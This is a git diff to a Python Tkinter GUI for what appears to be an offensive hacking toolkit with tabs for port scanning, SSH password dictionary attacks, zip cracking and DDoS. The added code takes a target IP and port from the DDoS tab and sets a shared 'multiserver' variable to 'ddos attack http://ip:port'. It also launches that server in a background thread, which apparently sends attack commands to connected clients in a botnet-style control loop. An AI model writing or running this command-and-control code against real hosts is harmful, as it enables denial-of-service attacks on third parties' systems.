@@ -7,6 +7,9 @@ from zipfile import ZipFile
 from port_scan import port_scanner
 from ssh import ssh_dictionary
 from unzip import unzip
+from Ddos import multiserver
+import threading
+import time
 
 class SampleApp(Tk):
     def __init__(self):
@@ -232,14 +235,15 @@ class DDos(Frame): #start 버튼을 누르면 공격중이라는 팝업이 떴�
         labelTultip.pack(side = "left", expand = YES, fill = BOTH)
 
         #ip 입력창
-        entry = Entry(ip, relief="flat", font=font, highlightthickness=5, highlightbackground="gray")
-        entry.pack(side = "right", expand = YES, fill = X)
+        self.entry = Entry(ip, relief="flat", font=font, highlightthickness=5, highlightbackground="gray")
+        self.entry.pack(side = "right", expand = YES, fill = X)
 
         labelIp=tkinter.Label(ip, text="IP: ", font=font)
         labelIp.pack(side = "right")
 
-        entry2 = Entry(port, relief="flat", font=font, highlightthickness=5, highlightbackground="gray")
-        entry2.pack(side = "right", expand = YES, fill = X)
+        #port 입력창
+        self.entry2 = Entry(port, relief="flat", font=font, highlightthickness=5, highlightbackground="gray")
+        self.entry2.pack(side = "right", expand = YES, fill = X)
 
         labelPort=tkinter.Label(port, text="PORT: ", font=font)
         labelPort.pack(side = "right")
@@ -258,9 +262,18 @@ class DDos(Frame): #start 버튼을 누르면 공격중이라는 팝업이 떴�
         exit.pack(side = "left", anchor = "s", padx = 50, expand = YES, fill = X)
 
     def textAttack(self):
+        ip = self.entry.get()
+        port = self.entry2.get()
         self.labelStat.configure(text="ATTACKING...")
+
+        addr = "http://" + ip + ":" + port
+
+        multiserver.put_data = "ddos attack " + addr
+        time.sleep(3)
+        multiserver.put_data = "wait..."
     def textStop(self):
         self.labelStat.configure(text="")
+        multiserver.put_data = "quit"
 
 class SSH(Frame): #password File이란 이름으로 file selector 추가
     def __init__(self, master):
@@ -384,5 +397,8 @@ class PortScan(Frame):
         port_scanner.connScan(self.entry.get(), int(self.entry2.get()))
 
 if __name__ == "__main__":
+    t = threading.Thread(target=multiserver.start_server)
+    t.daemon = True
+    t.start()
     app = SampleApp()
     app.mainloop()
